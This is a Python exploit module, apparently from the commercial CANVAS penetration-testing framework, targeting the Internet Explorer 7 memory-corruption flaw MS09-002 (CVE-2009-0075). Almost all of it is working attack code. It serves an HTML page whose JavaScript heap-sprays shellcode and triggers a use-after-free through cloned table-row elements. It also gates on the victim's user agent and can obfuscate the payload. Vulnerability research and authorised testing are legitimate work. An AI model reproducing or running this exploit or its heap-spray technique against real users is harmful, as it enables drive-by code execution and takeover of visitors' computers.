#! /usr/bin/env python

#
# CANVAS Exploit
#

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys

if "." not in sys.path: sys.path.append(".")

import os,getopt
import socket
from exploitutils import *
from encoder import addencoder
from shellcode import shellcodeGenerator, win32shell # win32shell / linuxshell ???
from tcpexploit import tcpexploit
import canvasengine
from canvasengine import socket_save_list
import time

from httpclientside import httpclientside

NAME="MS09_002"
DESCRIPTION="Memory corruption in Internet Explorer 7 allows arbitrary code execution."
DOCUMENTATION={}
DOCUMENTATION["VENDOR"]       = "Microsoft"
DOCUMENTATION["Date public"]  = "02/10/2009"
DOCUMENTATION["CERT Advisory"]= "http://www.us-cert.gov/cas/techalerts/TA09-041A.html"
DOCUMENTATION["Repeatability"]= "One shot"
DOCUMENTATION["References"]   = "http://isc.sans.org/diary.html?storyid=5884&rss"
DOCUMENTATION["CVE Name"]     = "CVE-2009-0075"
DOCUMENTATION["CVE Url"]      = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0075"
DOCUMENTATION['CVSS'] = 8.5
DOCUMENTATION["Notes"]        = "This does not require a fromcreatethread listener."


VERSION="1.0"

PROPERTY            = {}
PROPERTY['TYPE']    = "Exploit"
PROPERTY['SITE']    = "Clientside"
PROPERTY['ARCH']    = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "XP" ]
PROPERTY['MSADV']   = 'MS09-002'
PROPERTY['DELIVERY'] = 'HTTP'


NOTES="""
To test from Commandline (it needs fromcreatethread)
   bash-3.00$ ./commandlineInterface.py -v 1 -p 5555
   bash-3.00$ exploits/httpserver/httpserver.py -O singleexploit:ms09_002 -l 192.168.1.1 -p 8080 -d 5555
"""

CHANGELOG="""

"""

class theexploit(httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)

        self.shellcode="\xcc" * 298
        self.setVersions()
        self.version=1
        self.badstring="\x00\xff"
        self.name=NAME 
        self.filename="index.html"    
        self.obfuscate = False
        
        return
    
    def is_vulnerable(self, info_dict):
        """
        Check to make sure this is something we want to run,
        in this case, it means "running IE 7"
        """ 
        devlog("ms09_002", "User Agent: %s"%info_dict['user_agent'])
        if "MSIE 7.0" in info_dict['user_agent']:
            return 60 #somewhat older
        else:
            devlog("ms09_002", "Not IE 7 therefor not vulnerable to this exploit")
            return 0
        
    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        #name, jmp esp, writeloc, writable, shelloc
        self.versions[1]=("Windows - all versions",None)

    def run(self):
        self.host=self.target.interface
        self.filename=self.argsDict.get("filename",self.filename)
        
        filedata=self.makefile()
        self.log("Opening %s for output"%self.filename)
        fd=file(self.filename,"wb+")
        fd.write(filedata)
        fd.close()
        self.log("Wrote to %s"%self.filename)
        return 1
     
        
    def javascript_encode(self):
        
        javascript_code = """
            var body = unescape(\"SHELLCODE\");
               
            var arrContents = getArrayContents(body);
                                             
            var placeHolder = unescape(\"%u0c0c%u0c0cBBBBBBBBBBBBBBBBBBBBBBBBB\");
            var nestArray = populateArray();
            
            
            loadBody2();
            window.location="/done";
            
            function populateArray()
            {
             var popArray = new Array();

             for (var x = 0; x < 1000; x++)
             {
                popArray.push(document.createElement(\"img\"));
             }
             
             return popArray;
            }


            function loadBody2()
            {
                element = document.createElement(\"tr\");
                element.click;
                var element2 = element.cloneNode();
                element.clearAttributes();
                element = null;
                
                for (var x = 0; x < nestArray.length; x++) 
                {
                    nestArray[x].src = placeHolder;
                    element2.click;
                }    
            }

            
            function getArrayContents( arrayBody )
            {
              var testArray = new Array(); 
              var arrLen = 0x100000-(arrayBody.length*2+0x01020); 
              var testStr = unescape(\"%u0C0C%u0C0C%u0C0C\");
            
              while (testStr.length < arrLen/2) 
              { 
                testStr+=testStr;
              }

              var testStr2 = testStr.substring(0,arrLen/2);
              delete testStr;

              for(i=0; i<0xC0; i++) 
              {
                testArray[i] = testStr2 + arrayBody;
              }
            
              return testArray;
            }
        """  
        
        # Swap in the shellcode and get rid of tabs
        javascript_code    = javascript_code.replace("SHELLCODE",urluencode(self.shellcode)).replace("\t","")
        
        self.obfuscate = self.argsDict.get( "obfuscate", self.obfuscate )
        if self.obfuscate:
            self.log("Obfuscating javascript code.")
            javascript_code    = self.obfuscate_javascript( javascript_code )
        
            
        
        return javascript_code
    
    
    def makefile(self):        
        
        filedata = "<html><head><script language='javascript'>JAVASCRIPT"
        filedata += """
            </script>
            </head>
            <body onLoad=\"loadBody();\">
            Javascript disabled.
            </body>
            </html>
            """
        javascript = self.javascript_encode()
        
        filedata = filedata.replace("JAVASCRIPT", javascript )
        
        return filedata
        
        
    def makesploit(self,clientheader,clientbody):
        """
        Construct the attack
        """
        from libs.spkproxy import header, body
        h=header("SERVER")
        b=body()
        if clientheader.URL.count(self.filename):
            #the exploit
            self.shellcode = self.createShellcode()
            sploitstring=self.makefile()
            h.addHeader("Content-Type","text/html")
            b.setBody(sploitstring)
        elif clientheader.URL.count("done"):
            self.log("%s exploit failed - returning None, None"%self.name)
            return None, None
        else:
            #redirect to self
            self.log("redirecting to self")
            h.status="302"
            h.addHeader("Location",self.filename)
            h.addHeader("Content-Type","text/html")

        return h,b



if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    
